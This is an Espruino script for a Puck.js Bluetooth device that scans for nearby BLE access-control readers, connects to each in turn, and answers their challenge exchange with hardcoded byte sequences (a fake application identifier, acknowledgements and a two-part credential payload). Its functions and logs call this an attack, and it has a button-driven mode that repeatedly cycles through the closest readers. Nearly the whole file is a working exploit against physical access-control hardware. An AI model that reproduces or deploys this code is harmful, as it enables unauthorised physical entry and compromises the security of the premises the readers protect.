var gatt;
var wrong = new Uint8Array([0xC0, 0x6A, 0x82]);
var aid = new Uint8Array([0xC0, 0x6F, 0x08, 0x85, 0x06, 0x02, 0x01, 0x40, 0x02, 0x01, 0x00, 0x90, 0x00]);
var ack = new Uint8Array([0xC0, 0x90, 0x00]);
var part1 = new Uint8Array([0x81, 0x44, 0x3E, 0x44, 0x00, 0x00, 0x00, 0xA6, 0x13, 0xA1, 0x11, 0xA1, 0x0F, 0x80, 0x01, 0x50, 0x81, 0x01, 0x01, 0x82]).buffer;
var part2 = new Uint8Array([0x40, 0x01, 0x01, 0x83, 0x01, 0x00, 0x84, 0x01, 0x01, 0x90, 0x00]).buffer;
var beep = new Uint8Array([0xC0, 0x44, 0x3E, 0x44, 0x00, 0x00, 0x00, 0xA6, 0x06, 0xA0, 0x04, 0x85, 0x02, 0x1F, 0x40, 0x90, 0x00]);
var longbeep = new Uint8Array([0xC0, 0x44, 0x3E, 0x44, 0x00, 0x00, 0x00, 0xA6, 0x06, 0xA0, 0x04, 0x85, 0x02, 0x7D, 0x00, 0x90, 0x00]);
var button = 0;
var hids = [];
var devs = [];
var id;
var starttime;
var endtime;

E.enableWatchdog(120); // If scan or connect hangs, reboot Puck                                                        

function attackreader() {
    console.log("Battery level: " + E.getBattery());
    var looptime = [];
    looptime.push(getTime());
    if (hids.length > 0) {
        console.log("Remaining devices: " + hids.length);
        var dev = hids.shift();
        console.log("Attacking Device: " + dev);
        NRF.connect(dev).then(function(g) {
            gatt = g;
            digitalPulse(LED2, 1, [1000, 1000, 1000]);
            count = 0;
            return gatt.getPrimaryService("00009800-0000-1000-8000-00177a000002");
        }).then(function(service) {
            return service.getCharacteristic("0000aa00-0000-1000-8000-00177a000002");
        }).then(function(characteristic) {
            characteristic.on('characteristicvaluechanged', function(event) {
                const byteArray = new Uint8Array(event.target.value.buffer);
                const hexParts = [];
                var senthex = '';
                for (let i = 0; i < byteArray.length; i++) {
                    const hex = byteArray[i].toString(16);
                    hexParts.push(hex);
                    senthex += hex;
                }
                hexParts.join('');
                //console.log("Received: " + senthex);
                if (senthex === "c00a440aa000440011010") {
                    characteristic.writeValue(wrong);
                    //console.log("Sent Wrong Aid");
                } else if (senthex === "c00a440aa00038202d0110") {
                    characteristic.writeValue(wrong);
                    //console.log("Sent Wrong Aid");
                } else if (senthex.match("c00a440aa00038202f0110")) {
                    characteristic.writeValue(aid);
                    //console.log("Sent Aid");
                } else if (senthex.match("c00da")) {
                    characteristic.writeValue(ack);
                    //console.log("Sent Ack");
                } else if (senthex === 'c00ca0000' && count == 0) {
                    count = (count + 1);
                    characteristic.writeValue(part1);
                    //console.log("Sent Part1");
                    setTimeout(function() {
                        characteristic.writeValue(part2);
                    }, 250);
                    //console.log("Sent Part2");
                } else if (senthex.match("c00da73000")) {
                    characteristic.writeValue(ack);
                    //console.log("Sent Ack");
                } else if (count == 1 && senthex === 'c00ca0000') {
                    characteristic.writeValue(longbeep);
                    try {
                        gatt.disconnect();
                    } catch (e) {}
                    try {
                        dev.disconnect();
                    } catch (e) {}
                    console.log("Beep");
                    //rollleds(250);
                    looptime.push(getTime());
                    console.log("Looptime: " + (looptime.pop() - looptime.shift()).toFixed(2) + " secs");
                } else {
                    looptime.push(getTime());
                    digitalPulse(LED1, 1, 2500);
                    console.log("Failed with " + senthex);
                    console.log(looptime);
                    console.log("Looptime: " + (looptime.pop() - looptime.shift()).toFixed(2) + " secs");
                }
            });
            return characteristic.startNotifications();
        }).catch(function() {
            console.log("Catch function");
            clearInterval(id);
            digitalPulse(LED1, 1, [500, 500, 500, 500, 500]);
            endtime = getTime();
            console.log("Total Time: " + (endtime - starttime).toFixed(2) + " secs");
            try {
                gatt.disconnect();
            } catch (e) {}
        });
    } else {
        console.log("Complete attack and clearing timer");
        clearInterval(id);
        rollleds(250);
        endtime = getTime();
        console.log("Total Time: " + (endtime - starttime).toFixed(2) + " secs");
        if (button === 1) {
            console.log("Rescanning for readers");
            doScan();
        } else if (button === 2) {
            console.log("Stopping scan");
            clearInterval();
        }
    }
}

function rollleds(ledtime) {
    digitalPulse(LED3, 1, ledtime);
    digitalPulse(LED2, 1, (ledtime * 2));
    digitalPulse(LED1, 1, (ledtime * 3));
}

function doScan() {
    starttime = getTime();
    digitalPulse(LED3, 1, [500, 500, 500]);
    NRF.findDevices(function(devs) {
        devs.sort((a, b) => parseFloat(b.rssi) - parseFloat(a.rssi));
        hids = devs.map(x => x.id);
        console.log("Number of readers: " + hids.length);
        if (hids.length != 0) {
            console.log("Kicked timer");
            E.kickWatchdog();
            attackreader();
            id = setInterval(attackreader, 30000);
        } else if (button === 0) {
            console.log("No readers detected");
            digitalPulse(LED1, 1, [500, 500, 500, 500, 500]);
            clearInterval();
        }
    }, {
        timeout: 2000,
        filters: [{
            services: ["00009800-0000-1000-8000-00177a000002"]
        }]
    });
}
setWatch(function(e) {
    var btntime = (e.time - e.lastTime);
    if (btntime < 0.5) { // on short press loop through closest devices only once
        console.log("One scan");
        button = 0;
        doScan();
    } else if (btntime > 0.51 && btntime < 2.0) { //on medium press this will continually loop through the closest 5 readers
        console.log("Continuious");
        button = 1;
        doScan();
    } else if (btntime > 2.01) { // on long press break out of cycle
        console.log("Trying to break loop scan");
        button = 2;
        clearInterval();
    }
}, BTN, {
    edge: "falling",
    debounce: 50,
    repeat: true
});
